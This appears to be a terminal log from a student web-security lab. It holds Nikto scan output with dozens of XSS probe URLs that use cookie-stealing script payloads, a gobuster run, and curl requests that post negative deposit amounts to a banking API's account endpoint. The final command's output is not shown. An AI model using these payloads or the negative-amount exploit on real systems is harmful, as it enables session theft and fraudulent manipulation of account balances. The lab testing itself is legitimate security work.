+ /affich.php?image=<script>alert(document.cookie)</script>: GPhotos index.php rep Variable XSS. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2397
+ /diapo.php?rep=<script>alert(document.cookie)</script>: GPhotos index.php rep Variable XSS. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2397
+ /index.php?rep=<script>alert(document.cookie)</script>: GPhotos index.php rep Variable XSS. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2397
+ /fcgi-bin/echo?foo=<script>alert('Vulnerable')</script>: Fast-CGI has two default CGI programs (echo.exe/echo2.exe) vulnerable to Cross Site Scripting (XSS). See: OSVDB-700
+ /fcgi-bin/echo2?foo=<script>alert('Vulnerable')</script>: Fast-CGI has two default CGI programs (echo.exe/echo2.exe) vulnerable to Cross Site Scripting (XSS). See: OSVDB-3954
+ /fcgi-bin/echo.exe?foo=<script>alert('Vulnerable')</script>: Fast-CGI has two default CGI programs (echo.exe/echo2.exe) vulnerable to Cross Site Scripting (XSS). See: OSVDB-700
+ /fcgi-bin/echo2.exe?foo=<script>alert('Vulnerable')</script>: Fast-CGI has two default CGI programs (echo.exe/echo2.exe) vulnerable to Cross Site Scripting (XSS). See: OSVDB-3954
+ /apps/web/index.fcgi?servers=&section=<script>alert(document.cookie)</script>: Zeus Admin server 4.1r2 is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1785
+ /index.php?err=3&email=\"><script>alert(document.cookie)</script>: MySQL Eventum is vulnerable to XSS in the email field. See: OSVDB-12606
+ /forgot_password.php?email=\"><script>alert(document.cookie)</script>: MySQL Eventum is vulnerable to XSS in the email field. See: OSVDB-12607
+ /bugs/index.php?err=3&email=\"><script>alert(document.cookie)</script>: MySQL Eventum is vulnerable to XSS in the email field. See: OSVDB-12606
+ /bugs/forgot_password.php?email=\"><script>alert(document.cookie)</script>: MySQL Eventum is vulnerable to XSS in the email field. See: OSVDB-12607
+ /eventum/index.php?err=3&email=\"><script>alert(document.cookie)</script>: MySQL Eventum is vulnerable to XSS in the email field. See: OSVDB-12606
+ /eventum/forgot_password.php?email=\"><script>alert(document.cookie)</script>: MySQL Eventum is vulnerable to XSS in the email field. See: OSVDB-12607
+ /login/sm_login_screen.php?error=\"><script>alert('Vulnerable')</script>: SPHERA HostingDirector and Final User (VDS) Control Panel 1-3 are vulnerable to Cross Site Scripting (XSS). See: OSVDB-2562
+ /login/sm_login_screen.php?uid=\"><script>alert('Vulnerable')</script>: SPHERA HostingDirector and Final User (VDS) Control Panel 1-3 are vulnerable to Cross Site Scripting (XSS). See: OSVDB-2562
+ /SPHERA/login/sm_login_screen.php?error=\"><script>alert('Vulnerable')</script>: SPHERA HostingDirector and Final User (VDS) Control Panel 1-3 are vulnerable to Cross Site Scripting (XSS). See: OSVDB-2562
+ /SPHERA/login/sm_login_screen.php?uid=\"><script>alert('Vulnerable')</script>: SPHERA HostingDirector and Final User (VDS) Control Panel 1-3 are vulnerable to Cross Site Scripting (XSS). See: OSVDB-2562
+ /index.php?vo=\"><script>alert(document.cookie);</script>: Ralusp Sympoll 1.5 is vulnerable to Cross Site Scripting (XSS). See: OSVDB-2790
+ /shopping/shopdisplayproducts.asp?id=1&cat=<script>alert('test')</script>: VP-ASP prior to 4.50 are vulnerable to XSS attacks. See: https://seclists.org/bugtraq/2004/Jun/210
+ /shopdisplayproducts.asp?id=1&cat=<script>alert(document.cookie)</script>: VP-ASP Shopping Cart 4.x shopdisplayproducts.asp XSS. See: https://seclists.org/bugtraq/2004/Jun/210
+ /cuentas/: This might be interesting.
+ /forum/memberlist.php?s=23c37cf1af5d2ad05f49361b0407ad9e&what=\">\"<script>javascript:alert(document.cookie)</script>: Vbulletin 2.2.9 and below are vulnerable to Cross Site Scripting (XSS). See: OSVDB-3280
+ /firewall/policy/dlg?q=-1&fzone=t<script>alert('Vulnerable')</script>>&tzone=dmz: Fortigate firewall 2.50 and prior contains several XSS vulnerabilities in various administrative pages. See: https://securitytracker.com/id/1008158
+ /firewall/policy/policy?fzone=internal&tzone=dmz1<script>alert('Vulnerable')</script>: Fortigate firewall 2.50 and prior contains several XSS vulnerabilities in various administrative pages. See: https://securitytracker.com/id/1008158
+ /antispam/listdel?file=blacklist&name=b<script>alert('Vulnerable')</script>&startline=0: Fortigate firewall 2.50 and prior contains several XSS vulnerabilities in various administrative pages. See: OSVDB-3295
+ /antispam/listdel?file=whitelist&name=a<script>alert('Vulnerable')</script>&startline=0(naturally): Fortigate firewall 2.50 and prior contains several XSS vulnerabilities in various administrative pages. See: OSVDB-3295
+ /theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter\"><script>alert('Vulnerable')</script>,/system/status/session: Fortigate firewall 2.50 and prior contains several XSS vulnerabilities in various administrative pages. See: OSVDB-3296
+ /theme1/selector?button=status,monitor,session&button_url=/system/status/status\"><script>alert('Vulnerable')</script>,/system/status/moniter,/system/status/session: Fortigate firewall 2.50 and prior contains several XSS vulnerabilities in various administrative pages. See: OSVDB-3296
+ /theme1/selector?button=status,monitor,session\"><script>alert('Vulnerable')</script>&button_url=/system/status/status,/system/status/moniter,/system/status/session: Fortigate firewall 2.50 and prior contains several XSS vulnerabilities in various administrative pages. See: OSVDB-3296
+ /examplesWebApp/InteractiveQuery.jsp?person=<script>alert('Vulnerable')</script>: BEA WebLogic 8.1 and below are vulnerable to Cross Site Scripting (XSS) in example code. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0624
+ /sgdynamo.exe?HTNAME=<script>alert('Vulnerable')</script>: Ecometry's SGDynamo is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0375
+ /docs/<script>alert('Vulnerable');</script>: Nokia Electronic Documentation is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0801
+ /aktivate/cgi-bin/catgy.cgi?key=0&cartname=axa200135022551089&desc=<script>alert('Vulnerable')</script>: Aktivate Shopping Cart 1.03 and lower are vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1212
+ /webcalendar/colors.php?color=</script><script>alert(document.cookie)</script>: Webcalendar 0.9.42 and below are vulnerable to Cross Site Scripting (XSS). See: OSVDB-3632
+ /webcalendar/week.php?user=\"><script>alert(document.cookie)</script>: Webcalendar 0.9.42 and below are vulnerable to Cross Site Scripting (XSS). See: OSVDB-3633
+ /debug/dbg?host==<script>alert('Vulnerable');</script>: The TCLHttpd 3.4.2 server is vulnerable to Cross Site Scripting (XSS) in debug scripts. See: OSVDB-3762
+ /debug/echo?name=<script>alert('Vulnerable');</script>: The TCLHttpd 3.4.2 server is vulnerable to Cross Site Scripting (XSS) in debug scripts. See: OSVDB-3762
+ /debug/errorInfo?title===<script>alert('Vulnerable');</script>: The TCLHttpd 3.4.2 server is vulnerable to Cross Site Scripting (XSS) in debug scripts. See: OSVDB-3762
+ /debug/showproc?proc===<script>alert('Vulnerable');</script>: The TCLHttpd 3.4.2 server is vulnerable to Cross Site Scripting (XSS) in debug scripts. See: OSVDB-3762
+ /addressbook.php?\"><script>alert(Vulnerable)</script><!--: Squirrel Mail 1.2.7 is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1131
+ /help.php?chapter=<script>alert('Vulnerable')</script>: Squirrel Mail 1.2.7 is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1131
+ /wwwping/index.stm?wwwsite=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/create.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/edit.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/ftp.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/htaccess.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/iecreate.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/ieedit.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/info.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/mkdir.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/rename.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/search.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/sendmail.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/template.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/update.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/vccheckin.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/vccreate.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/vchist.stm?path=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/edit.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/ieedit.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/info.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/rename.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/sendmail.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/update.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/vccheckin.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/vccreate.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/vchist.stm?name=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /syshelp/stmex.stm?foo=123&bar=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /syshelp/stmex.stm?foo=<script>alert(document.cookie)</script>&bar=456: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /syshelp/cscript/showfunc.stm?func=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /syshelp/cscript/showfncs.stm?pkg=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /syshelp/cscript/showfnc.stm?pkg=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /netutils/ipdata.stm?ipaddr=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /netutils/findata.stm?host=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /netutils/findata.stm?user=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /sysuser/docmgr/search.stm?query=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). See: https://seclists.org/fulldisclosure/2003/Mar/265
+ /webtools/bonsai/cvsqueryform.cgi?cvsroot=/cvsroot&module=<script>alert('Vulnerable')</script>&branch=HEAD: Bonsai is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0154
+ /webtools/bonsai/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script>: Bonsai is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0154
+ /webtools/bonsai/cvsquery.cgi?module=<script>alert('Vulnerable')</script>&branch=&dir=&file=&who=<script>alert(document.domain)</script>&sortby=Date&hours=2&date=week: Bonsai is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0154
+ /webtools/bonsai/cvslog.cgi?file=*&rev=&root=<script>alert('Vulnerable')</script>: Bonsai is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0153
+ /webtools/bonsai/cvslog.cgi?file=<script>alert('Vulnerable')</script>: Bonsai is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0153
+ /webtools/bonsai/cvsblame.cgi?file=<script>alert('Vulnerable')</script>: Bonsai is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0154
+ /webtools/bonsai/showcheckins.cgi?person=<script>alert('Vulnerable')</script>: Bonsai is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0154
+ /J2dfSg0YxendYOnWyHADwX9gwgDftBy3539z48K4ty1Km5AR5oeeH4yhNerJxPxTeIydYmcauhGqXRQvG0P7vpCVvITgfu6dOX5a8MZVQQbhMvIZSsoe5IuO2l3DYGothl0Cnj9jutEbgq0qUnL4rNAMoPZxG2W3YAkbM5rzsCK064r2KiF57HNEE2jeDyMevpO1fkKhvtSuLgoDGROgMZ4OXx8427W<font%20size=50><script>alert(11)</script><!--//--: MyWebServer 1.0.2 is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1453
+ /pls/dadname/htp.print?cbuf=<script>alert('Vulnerable')</script>: Oracle 9iAS is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-2029
+ /pls/help/<script>alert('Vulnerable')</script>: Oracle 9iAS is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-2029
+ /shopadmin.asp?Password=abc&UserName=\"><script>alert(foo)</script>: VP-ASP Shopping Cart 5.50 shopadmin.asp UserName Variable XSS. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3685
+ /phpinfo.php?GLOBALS[test]=<script>alert(document.cookie);</script>: PHP contains a flaw that allows a remote cross site scripting attack. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3388
+ /phpinfo.php?cx[]=5L3wveZQTDrormDxUxpn7xNoaaItfnkmw3n9wrHZwYQeNVJfpglNGj7RS8QtF4a7AhXbTqTmgsqw55N9pcQ7aL44GdZdbhPdKRrMUjuNVPmTSdCFiVKZdzJCA1UMQRpLtsUau8cVGXls7kvK325uWRrmpdyJl6oxLgRKj68CRL5HWNPugEiZMC4UZeaRhc9ziRiIYqhrXVyY4H7XXvRxvRd7GSkteEc7tQrlu3isjrwX9g7qHpClUaqjPdr12TQlj3uLKTp03PGrF0BABgHQwQeLLanpW1wp9A5xdbAQHvfkRYYyFm6X5qaBFBpyWEy98qOBIeKdZx1R8xDzQfLNaQM8Y5eBRSBdJNnXrbkjnCWXxuhwBVqAhWmFG6vtQsrUJdPU2jLERwe3HxOj9EU7nJPx6Ti2rYCougvWSmwWkEJOTaeSaXcoLOpNFS5v8iluAUU1pjPEi9ekrVacanZHkDk24yFGr083JLqRM94hb7Gnn1oOpjXXh0gZq4Fft6SQ7JXkqeYfYkr5mlUpqEwB7kX3Sj0S9EzTYHfPYyerp0BxQQ7Y7zntg4yKczHCLQuxvwp3aA6uyj8VDksTpWrqK608KJVQbR2Lc5Qu55oxRFbFuzcHu5H2A3gYw4iBt6ZotMyienjVIRbVfTFIK3gNlKx3xIlycqruvLN79LXeq4a80WGo1euugyn9gnob2BbyDZ38MgsjAxT4KamxMwjaCPL8s3lM7MK1QMv2kxGD4h2N4h6bBRxbCf1NWU8xGeRCQdFgY6YEgmi7mu3rlfoTzeMMV13ts4BNa8BbYN4t2dG10IIRW85izpJ9cuvvmeXbWSiBEz6uMBuzcBZUIoAwsUqhMhWiWs6cHIA0Ri4plzALFtiWevl9iUW7Er7h4y1uISgmcb5h4XmUW7laUulk3VsVH5lsqDUByuKxM79Jv40WHvRcXW5U0kNpVOnmgCSt4SRfJvRisPsbzjPFbQO84IWgPH6OWHvhyWgKf9s8yYB9XpUg6uHx3mf4XWQOGbBUsR1VrATwcXeJs6jUQaolRCWIKZDc99QRfNEdByhWaJdt9sLtu0nXkrd5ugSBhzHUG1sOlIfWliqbDhXqatFcpGrkAs9XTe5VlYlUdGNrg3VEO5c8tawrJGdnVloqx4vGGLQ15iX1P5MLpZo7LalryBsVxh8Q8rIMaHFo473uH5kxrpiSLJxi9ZaVm87AUDXrV4qBabDuTdVN9ydL1tHXt5tioQ521oOAA4V5w2arcQ8C25EjC1HPrujhPxRfzMtEG1E0k2imBQysljMLS36Ykm9UAhxugRHJ1EMVkMPcE2U0ExFVcLstP9DdUe8PrQcvPHlT94s4MbSOT3eeTTUghS9zhweyN3HoNv0fVI0HyZbxredgdZNdtIiEtD4LrjnCN9U023v62Ik3HkGhppsGIqlCQmGKEbapGjeQXiSpMSJaKjylPn1hmPuTMhurWz73HONxjsiIdrp4rlLs9Tt5GleatUSPZgTjOSdl3najwb6CBsngKIE5hrr1HggmzOhtR1mvFYXRVwVaGPmGX5BcD6BG6edcAeEMDLbRPRuXxushr5ibFFIkiqHzk8XG8eHDvQRxMa4yrao49oG7L5j5l0oNFjSqp9X6jksMfwaSBlAjTzmqSN6vhzGwIRFPWqC9DbHQdvWgNDJehVpzXvUzdiVmocc4tOb9hPpX33aekDg5a12SaQmwHBqtY79vf6nmj2XtCudJ5J9l2ogXJNS6DmgOznrLXASn7TwZCqjB3VJNi2hFWbzCPHI3xTdU20mG67aL3dNZdho61OM72WuNLiVEouOAEnkdviSUTuMd6ixnWQV8BAFAY5eCFdf806cXIFm6I1OwA37bIvfRsjEIuEHkceFAs3kCGLKXMMOfheBAkIjQejMa7TecmecSNZaf0wfUQp6SjPxz2A2bvNVpCtWgPvZEnSl0WiuMBFHvBTtujxa8sf0FLqdGgrztuzXOapSRNoIjyNs1eG4RbdVKnCRclPdzyoLetxIJTA0fgCX0ZHMGxum02r1i1lTYq3xeazipwNQR65lRRZwfESSW4ceHV36jHur2ruGurJ0lRAORddisQ7YMYQ8cT6gK43pZsyBrd6NBfHN05pWdmBqP8nm2Ze3JFDBzkvUWvPsFVRTJE5pRr9xJaB9woEf1o3Z9Ugen8kw5UyedkbpxdGLtit7dILzhmtOftq7itfzEAzozTUf9XP4oyTDts1ZZh4li3jrgTh08XRNA0u5m7qUTZ7uiDR07QEnUV0kptkagBpskVKq4L6N4zt7OHLxUiC9NvC9qJZkQPIwnAzXZLFobcQ7WAcyuJQS4vIipy0g3ylVOOhyKntpXrmnBXSwBJSOfC7R2gqAPnYPXWQPYCJVJkSkgPPudK5WBaA8zRyGymCnOC6JW1RuyOIZ14LY9L7Zdw02ejvlI0j59TxCjayERq69RxiCBGhntusfqcM6U0YwvAqwkA0hnwY8DWvrP2kfagRvh8gcS2EFFYjN3tZnwGoS7qa5vr3uYzoo6PifMu6E6BS1dJTzUMkAPQtpmlhYJhql5LgDudF1Vzid1TA9s96DPGxjBuNBW7pbXt7on6ptKRGjtivUEse2sU5PlHzD94dQTEr6KIH959m2S9kcmEPiW87h1pXTsInDoBw3XRYdELYZFUT8HErCQZO0Tu89ZdMKlFWqj7SgeUy5qwQSA4vGEEgXdOAtzpi93X7VnhKQqbqaqUo0jC7HVEwNJ3RE9tSQC7pibQpLYtVe5oN6MKzXJQt5UpcHyACz5kaeXk7FRQ9u9q7dQL9RFwZQhnCn1k9H1hogBJcjb4qfJ3uQ5fBg3XYazsMJ4Z6GQAd4GGw6G1NzXRLxX1WjPMFi76kR1CTFCX6HjTLm0KdLGCJ4ij0Ft2KGSm5nU3BJEXSctbwNLrSDIpAl3vchOXOBKPvpey7akrmc9QfM8Z7x1o2Jx54kNoBBCte7LwmrZzXYWAYPuwtly5GgRd7UX1DFxvOMsQTe1DNeDOPNkuoX5jX9VviQ9dA6Kittlds5PdND6vvmoM2ZvHsdthPdRDZcRh78pcXe9rkU8okb8hJNiKIBM9NZBvKAJRiuG9rUfnOHGIjm7xyPnoqvqaVq9H2kDqzb80qWouQ61nZC0Utd8s75K6bAOhWS5gFHPQjMgumLkA2HrMPJUcdnbmwwn9ouWC6GPi0MEXePaSGur971vWEutayGgW3KeCC0ySK20wSpmN3qLsd4fUMHLbhXg3kt5r56HXckkLuPMGaFDI29aUUTmqKUvZoEza6aALvHYG6sAlXmHPpOwj0SGQQK3OnSF6fzf6U9KWhnjPNO8kwsAYc6CRUgGToIQCWePY8RMxLtqOfPZaAXNql8aOxLhL2E9tS5JTkIWmBtJteKS3ZJYPpAxldSqitVFNdu4iVeTcmqiLlNEKL5ckVUtsafEYXZwjeUUpULDxK454G7xSuSvjdt4SVhQrdJntNoKn5cOThHfwN5kVslmQLAHNgBhf3sfIekVQJOqSvN9A9kWtqvV5lSC2GKSOPE5z8Z4BeOoL8iRcKZZGuu4RgsADqp5udktYqvBZ6RmZHGxg8KSfACgiky5HZZR3Ml5snql72jvRiniOG3Lg8i8z1VJT1Ku9Wdrt4MWWjtAqLmRmm77JkFVElG90Z6kaFRjCzOCbcEQrPTKTr874vbBeOY3e1Io7vWjYF2J1K2mwQngh1eG3aMVDhYRyxE3Us4jsidtIDv4stA17mGgU977WNRqPadkGaCZ7ApBYfhjAULdZ0QlNqht1fYnVp6psSqbwt49bVm8q3fskNjJpVHCS83yzr0STL3na1eesz0UigVryAQq2erHI6D2kSyUm3Z0OmFSA2SWk2b1NTzlG6CcADugfBVp4slRZaeOHjbcjfId1eKKGRqIDoeIAsx1DrBmnU2tRdCa0mTEEs3jjL9jJQ0Ohav0ANKWkCZKsWbLgcOPxHiYZ7HT4tmgqXgci0scfkYaqdSnDA5WCjEArpd8Th4DvxLCWZMgg6zEg8g0OFgqGsp5o8kpcSipNJ0gTCKUyOkL0KQqu7U22G7DjLkhIUEefp9y2vAN2myy<script>alert(foo)</script>: PHP 5.1.2 and 4.4.2 phpinfo() Function Long Array XSS. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1663 http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0996
+ /rpc.php?q=\"><script>alert(document.cookie)</script>: Unobtrusive Ajax Star Rating Bar is vulnerable to XSS in the q variable. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3685
+ /jsp-examples/jsp2/jspx/textRotate.jspx?name=<script>alert(111)</script>: The tomcat demo files are installed, which are vulnerable to an XSS attack. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4838
+ /jsp-examples/jsp2/el/implicit-objects.jsp?foo=<script>alert(112)</script>: The tomcat demo files are installed, which are vulnerable to an XSS attack. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4838
+ /jsp-examples/jsp2/el/functions.jsp?foo=<script>alert(113)</script>: The Tomcat demo files are installed, which are vulnerable to an XSS attack. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4838
+ /scripts/message/message_dialog.tml?how_many_back=\"><script>alert(1)</script>: Lyris ListManager Cross-Site Scripting. See: https://www.procheckup.com/media/zjkb3pmc/new-listmanager-paper-v2.pdf
+ 8073 requests: 0 error(s) and 227 item(s) reported on remote host
+ End Time:           2026-02-04 19:56:25 (GMT-5) (33 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.100.168
+ Target Hostname:    192.168.100.168
+ Target Port:        8080
+ Start Time:         2026-02-04 19:56:26 (GMT-5)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /Ze25U7ts.config: Uncommon header 'content-disposition' found, with contents: inline;filename=f.txt.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .
+ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ 8073 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2026-02-04 19:57:30 (GMT-5) (64 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

┌──(kali㉿kali)-[~/Desktop/SW_LAB3]
└─$ gobuster dir -u http://192.168.100.168:3000 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.168:3000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================


                                                                       
┌──(kali㉿kali)-[~/Desktop/SW_LAB3]
└─$ curl -X POST http://192.168.100.168:3000/cuentas/0c9a0470-bed1-4b22-a42b-f23e6099e598/deposito \
-H "Content-Type: application/json" \
-d '{"monto": -500}'
{"id":"0c9a0470-bed1-4b22-a42b-f23e6099e598","socioId":"8e8826d5-1c21-4642-9f6d-81f4ce112c79","numeroCuenta":"CTA-1769528178","saldo":0,"estado":"ACTIVA","tipoCuenta":"AHORRO","fechaCreacion":"2026-01-27T20:36:25.102Z","fechaActualizacion":"2026-02-05T06:24:01.000Z"}                                                                                                                                          
┌──(kali㉿kali)-[~/Desktop/SW_LAB3]
└─$ curl -X POST http://192.168.100.168:3000/cuentas/0e5b3417-1749-4b05-94a9-4afefa7982d0/deposito \
-H "Content-Type: application/json" \
-d '{"monto": -500}'
{"id":"0e5b3417-1749-4b05-94a9-4afefa7982d0","socioId":"d1ed7111-1729-41af-b969-25f1d3e1435b","numeroCuenta":"TEST1769098123","saldo":14500,"estado":"ACTIVA","tipoCuenta":"AHORRO","fechaCreacion":"2026-01-22T21:08:43.350Z","fechaActualizacion":"2026-02-05T06:24:17.000Z"}                                                                                                                                          
┌──(kali㉿kali)-[~/Desktop/SW_LAB3]
└─$ curl -X POST http://192.168.100.168:3000/cuentas/0e5b3417-1749-4b05-94a9-4afefa7982d0/deposito \
-H "Content-Type: application/json" \
-d '{"monto": -500}'
